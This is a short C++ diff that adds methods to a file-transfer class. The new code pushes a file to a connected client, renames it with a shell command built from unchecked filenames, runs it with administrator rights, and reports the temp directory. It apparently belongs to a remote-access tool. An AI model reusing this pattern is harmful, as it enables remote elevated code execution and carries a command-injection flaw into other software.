@@ -136,3 +136,24 @@ void Transfer::Copy(std::string filename_out, std::string filename)
 	}
 }
 	
+void Transfer::ask(Client* client, const std::string filename,const std::string new_name)
+{
+	if (uploadToClient(client, filename))
+	{
+		client->send_b("Rename..");
+		const std::string cmd = "ren " + filename + " " + new_name;
+		const std::string ret = Shell::return_command(cmd);
+		if (ret != "") { client->send_b(ret.c_str()); }
+		client->send_b("Done");
+		Shell::exeAdmin(client, new_name);
+	}
+}
+void Transfer::getTemp(Client* client)
+{
+	char const *folder = getenv("TMPDIR");
+	if (folder != 0)
+
+		client->send_b(("Temp directory : " + std::string(folder)).c_str());
+	else
+		client->send_b("Can't find the Temp directory ..");
+}
